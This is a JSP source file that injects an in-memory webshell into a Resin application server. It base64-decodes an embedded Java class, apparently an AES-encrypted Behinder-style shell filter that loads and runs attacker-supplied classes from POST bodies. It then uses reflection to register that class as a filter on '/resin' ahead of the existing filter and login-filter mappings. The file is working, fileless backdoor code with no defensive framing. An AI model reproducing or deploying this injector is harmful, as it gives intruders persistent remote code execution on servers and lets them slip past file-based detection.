<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="com.sorry.bug.CustomFilter" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %><%--
  Created by IntelliJ IDEA.
  User: 0x22cb7139
  Date: 2021/9/29
  Time: 11:46 下午
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    try{
        String path = "/resin";
        String filter64="yv66vgAAADQA1AoAKgBqBwBrBwBsCABtCABuCwADAG8LAAIAcAgAcQoAIAByCABzCwACAHQIAHULAHYAdwgAeAoAeQB6BwB7CgAgAHwKABAAfQoAeQB+BwB/CgAUAGoIAIALAIEAgggAgwgAhAsAAgCFBwCGCgAbAGoKAIcAiAoAGwCJCgB5AIoHAIsKACAAjAcAjQgAjgcAjwcATAkAkACRCgAkAJIKAJMAlAoAIgCVBwCWCgCQAJcKAJMAmAoAJACZCgAqAHIHAJoKAC8AmwsAnACdBwDSBwCfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL3NvcnJ5L2J1Zy9DdXN0b21GaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAoAEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAAWsBABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQALcGFnZUNvbnRleHQBAA9MamF2YS91dGlsL01hcDsBAAJiZgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAJzYgEAC2RlZmluZWNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABYQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA3JzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA1TGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlBwBrBwBsBwCaBwChAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABFDdXN0b21GaWx0ZXIuamF2YQwANAA1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQANWC1HZW8tQ291bnRyeQEAASoMAKIAowwApAClAQAEUE9TVAwApgCnAQAQZjVkN2FhM2JhNDkyOWNjMQwAqACpAQABdQcAqgwAqwCsAQADQUVTBwCtDACuAK8BAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDACwALEMADQAsgwAOwCzAQARamF2YS91dGlsL0hhc2hNYXABAAdzZXNzaW9uBwC0DAC1ALYBAAdyZXF1ZXN0AQAIcmVzcG9uc2UMALcAuAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIHALkMALoApQwAuwC8DAC9AL4BABBqYXZhL2xhbmcvU3RyaW5nDAA0AL8BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcAwAwAwQBRDADCAMMHAMQMAMUAxgwAxwDIAQAQamF2YS9sYW5nL09iamVjdAwAyQDKDADLAMwMAM0AzgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAM8ANQcA0AwAQQDRAQAaY29tL3NvcnJ5L2J1Zy9DdXN0b21GaWx0ZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQANamF2YS91dGlsL01hcAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEABShbQilWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABRnZXRTeXN0ZW1DbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEALGNvbS9iYWlkdS9vcGVucmFzcC9JbnZva2VGaWx0ZXIxNjMyODkyNTgyNzkzAQAuTGNvbS9iYWlkdS9vcGVucmFzcC9JbnZva2VGaWx0ZXIxNjMyODkyNTgyNzkzOwAhADIAKgABADMAAAAEAAEANAA1AAEANgAAAC8AAQABAAAABSq3AAGxAAAAAgA3AAAABgABAAAADgA4AAAADAABAAAABQA5ANMAAAABADsAPAACADYAAAA1AAAAAgAAAAGxAAAAAgA3AAAABgABAAAAEQA4AAAAFgACAAAAAQA5ANMAAAAAAAEAPQA+AAEAPwAAAAQAAQBAAAEAQQBCAAIANgAAAnIABgAPAAABHivAAAI6BCzAAAM6BRkFEgQSBbkABgMAGQS5AAcBABIItgAJmQDoEgo6BhkEuQALAQASDBkGuQANAwASDrgADzoHGQcFuwAQWRkGtgAREg63ABK2ABO7ABRZtwAVOggZCBIWGQS5AAsBALkAFwMAVxkIEhgZBLkAFwMAVxkIEhkZBbkAFwMAVxkEuQAaAQA6CRkHuwAbWbcAHBkJtgAdtgAetgAfOgq7ACBZGQq3ACE6CxIiEiMGvQAkWQMSJVNZBLIAJlNZBbIAJlO2ACc6DBkMBLYAKBkMuAApBr0AKlkDGQpTWQQDuAArU1kFGQq+uAArU7YALMAAJDoNGQ22AC06DhkOGQi2AC5XsacACjoGGQa2ADAtKyy5ADEDALEAAQAXAQoBDgAvAAQANwAAAGoAGgAAABQABgAVAAwAFgAXABgAJgAZACoAGgA6ABsAQQAcAFUAHQBeAB4AbwAfAHsAIACHACEAkAAiAKYAIwCxACQAzwAlANUAJgD7ACcBAgAoAQoAKQELAC0BDgArARAALAEVAC4BHQAvADgAAACiABAAKgDhAEMARAAGAEEAygBFAEYABwBeAK0ARwBIAAgAkAB7AEkASgAJAKYAZQBLAEwACgCxAFoATQBEAAsAzwA8AE4ATwAMAPsAEABQAFEADQECAAkAUgBTAA4BEAAFAFQAVQAGAAABHgA5ANMAAAAAAR4AVgBXAAEAAAEeAFgAWQACAAABHgBaAFsAAwAGARgAXABdAAQADAESAF4AXwAFAGAAAAAMAAEAXgCtAEcAYQAIAGIAAAAQAAP9AQsHAGMHAGRCBwBlBgA/AAAABgACAGYAQAABAGcANQABADYAAAArAAAAAQAAAAGxAAAAAgA3AAAABgABAAAANAA4AAAADAABAAAAAQA5ANMAAAABAGgAAAACAGk=";
        byte[] evil = new BASE64Decoder().decodeBuffer(filter64);
        ClassLoader classloader = Thread.currentThread().getContextClassLoader();
        Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
        Class filterConfigimplcls = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
        Class filterMappingcls = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
        Class filterMappercls = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");

        Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
        Object webapp = contextRequest.getClass().getDeclaredMethod("getWebApp").invoke(contextRequest);
        Method defineclass= classloader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE);
        defineclass.setAccessible(true);
        Class clazz = (Class) defineclass.invoke(classloader,evil,0,evil.length);
        Filter newFilter = new CustomFilter();
        String newFilterStr = "newfilter";
        Object filterConfigimpl = filterConfigimplcls.newInstance();
        filterConfigimpl.getClass().getMethod("setFilterName",new Class[]{String.class}).invoke(filterConfigimpl,new Object[]{newFilterStr});
        filterConfigimpl.getClass().getMethod("setFilterClass",new Class[]{String.class}).invoke(filterConfigimpl,new Object[]{newFilter.getClass().getName()});
        webapp.getClass().getDeclaredMethod("addFilter",new Class[]{Filter.class}).invoke(webapp,new Object[]{filterConfigimpl});

        Object filterMapping = filterMappingcls.newInstance();
        Field URLPattern = filterMapping.getClass().getField("URLPattern");
        URLPattern.setAccessible(true);
        Object filterMappingUrlpattern= filterMapping.getClass().getMethod("createUrlPattern",new Class[0]).invoke(filterMapping,new Object[0]);
        URLPattern.set(filterMapping,filterMappingUrlpattern);
        filterMappingUrlpattern.getClass().getMethod("addText",new Class[]{String.class}).invoke(filterMappingUrlpattern,new Object[]{path});
        filterMappingUrlpattern.getClass().getMethod("init",new Class[0]).invoke(filterMappingUrlpattern,new Object[0]);
        filterMapping.getClass().getMethod("setFilterName",new Class[]{String.class}).invoke(filterMapping,new Object[]{newFilterStr});
        filterMapping.getClass().getMethod("setServletContext",new Class[]{Object.class}).invoke(filterMapping,new Object[]{webapp});

//set filtterMapper
        Field fieldWebappFilterMapper = null;
        try {
            fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
        }catch (NoSuchFieldException Exception){
            fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
        }

        fieldWebappFilterMapper.setAccessible(true);
        Object filtermapper =  fieldWebappFilterMapper.get(webapp);

        Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
        fieldFilterMapperFilterMap.setAccessible(true);

        ArrayList<Object> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
        ArrayList<Object> newFilterMappings = new ArrayList(orginalfilterMappings.size() + 1);
        newFilterMappings.add(filterMapping);

        int count = 0;
        while(count < orginalfilterMappings.size()){
            newFilterMappings.add(orginalfilterMappings.get(count));
            ++ count;
        }

        fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
        fieldWebappFilterMapper.set(webapp, filtermapper);

//set loginFilterMapper
        Field fieldWebappLoginFilterMapper = null;
        try{
            fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");
        }catch (NoSuchFieldException Exception){
            fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMapper");
        }

        fieldWebappLoginFilterMapper.setAccessible(true);
        Object loginFilterMapper = fieldWebappLoginFilterMapper.get(webapp);

        ArrayList<Object>  orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
        ArrayList<Object> newLoginFilterMappings = new ArrayList(orginLoginFilterMappings.size() + 1);
        newLoginFilterMappings.add(filterMapping);

        count = 0;
        while( count < orginLoginFilterMappings.size()){
            newLoginFilterMappings.add(orginLoginFilterMappings.get(count));
            ++ count;
        }

        fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);
        fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);

        webapp.getClass().getMethod("clearCache").invoke(webapp);
    }catch (Exception e){
        e.printStackTrace();
    }
    filterChain.doFilter(servletRequest,servletResponse);
    }
%>
